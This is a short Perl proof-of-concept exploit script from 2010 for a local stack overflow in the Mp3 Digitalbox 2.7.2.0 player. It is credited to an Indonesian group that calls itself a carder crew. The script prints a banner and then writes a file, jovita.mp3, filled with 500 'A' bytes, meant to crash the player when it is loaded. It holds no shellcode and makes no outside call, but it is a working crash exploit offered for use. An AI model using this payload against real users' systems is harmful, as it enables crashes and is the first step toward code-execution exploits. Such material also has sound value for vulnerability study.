#!/usr/bin/perl

# Mp3 Digitalbox 2.7.2.0 (.mp3) Local Stack Overflow POC
# Author	: v3n0m
# Site		: http://yogyacarderlink.web.id/
# Group		: YOGYACARDERLINK
# Date		: July, 02-2010 [INDONESIA]
# Software	: Mp3 Digitalbox
# Version	: 2.7.2.0 Other versions may also be affected
# Download	: http://www.tsoft.aplus.pl/
# Greetz	: All Yogyacarderlink & devilzc0de Crews
sub clear{
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); }
clear();
print "|-----------------------------------------------------------|\n";
print "|   Mp3 Digitalbox 2.7.2.0 (.mp3) Local Stack Overflow POC  |\n";
print "| Created  : v3n0m                                          |\n";
print "| E-mail   : v3n0m666[at]live[dot]com                       |\n";
print "|                                                           |\n";
print "|                                                           |\n";
print "|                                 www.yogyacarderlink.web.id|\n";
print "|-----------------------------------------------------------|\n";
print " Usage: Run this c0de, load file and bo0om!!\n\n";
my $fuck = "\x41" x 500;
my $file = "jovita.mp3";
open (FILE,">$file") or die "[!]Cannot open file";
print FILE "$fuck";
print "\nFile successfully created!\n";